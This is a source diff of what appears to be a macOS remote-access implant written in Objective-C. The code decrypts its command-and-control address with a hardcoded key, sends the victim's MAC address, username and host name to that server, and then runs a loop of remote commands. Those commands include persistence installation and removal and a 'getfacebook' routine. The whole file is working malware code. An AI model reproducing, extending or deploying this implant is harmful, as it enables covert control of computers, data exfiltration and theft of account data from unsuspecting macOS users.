@@ -6,50 +6,40 @@
 //  Copyright © 2016 Lucas Jackson. All rights reserved.
 //
 #import <Foundation/Foundation.h>
-
-#import <CommonCrypto/CommonCryptor.h>
 #import <sys/socket.h>
 #import "AppKit/AppKit.h"
 #import "espl.h"
-
+NSString *bkey = @"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV";
 espl *_espl;
 
 //MARK: Main
 
 int main(int argc, const char * argv[]) {
-    NSArray *socketInfo;
     _espl = [[espl alloc] init];
-    NSLog(@"%@",[NSString stringWithFormat:@"%s",argv[0]]);
-
     if (argc == 1) { return 0; }
+    //decrypt argument with shared key
     NSString *argument = [NSString stringWithFormat:@"%s",argv[1]];
-    NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:argument options:0];
-    argument = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
-    argument = [FBEncryptorAES decryptBase64String:argument keyString:@"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV"];
+    argument = [escryptor decryptB64ToNSString:bkey :argument];
     NSArray *args = [argument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
-    socketInfo = args;
     int success = [_espl connect:[NSString stringWithFormat:@"%@",args[0]] :atoi([args[1] UTF8String])];
     _espl.skey = args[2];
-    _espl.terminator = args[3];
-    
+    _espl.terminator = [args[3] substringToIndex:16];
     if (success == -1) {
         NSLog(@"couldnt establish connection %s %s %s",argv[1],argv[2],argv[3]);
     }
     else {
-        NSString *name = [NSString stringWithFormat:@"%@ %@@%@",[_espl GetMACAddressDisplayString],NSUserName(),[[NSHost currentHost] localizedName]];
-        [_espl sendString:name];
+        //send mac address, username@host info to server
+        NSString *systeminfo = [NSString stringWithFormat:@"%@ %@@%@",[_espl GetMACAddressDisplayString],NSUserName(),[[NSHost currentHost] localizedName]];
+        [_espl sendString:systeminfo];
+        //eggshell
         NSString *command;
         char buffer[2048];
         while (read (sockfd, &buffer, sizeof(buffer))) {
             @autoreleasepool {
                 command = [NSString stringWithFormat:@"%s",buffer];
-                NSString *trim = [command stringByTrimmingCharactersInSet:[NSCharacterSet controlCharacterSet]];
-                trim = [FBEncryptorAES decryptBase64String:trim keyString:_espl.skey];
-                command = trim;
-                NSArray *cmdarray = [trim componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
-                
+                command = [escryptor decryptB64ToNSString:_espl.skey :command];
+                NSArray *cmdarray = [command componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
                 //TODO: make this 1 function, by checking arrays for valid cmds
-                
                 if ([cmdarray[0] isEqualToString: @"exit"]) {
                     exit(0);
                 }
@@ -94,10 +84,10 @@ int main(int argc, const char * argv[]) {
                     [_espl openURL:cmdarray];
                 }
                 else if ([cmdarray[0] isEqualToString: @"persistence"]) {
-                    [_espl persistence:socketInfo[0]:socketInfo[1]];
+                    [_espl persistence:args[0]:args[1]];
                 }
                 else if ([cmdarray[0] isEqualToString: @"rmpersistence"]) {
-                    [_espl removePersistence:socketInfo[0]:socketInfo[1]];
+                    [_espl removePersistence:args[0]:args[1]];
                 }
                 else if ([cmdarray[0] isEqualToString: @"getfacebook"]) {
                     [_espl getFacebook];
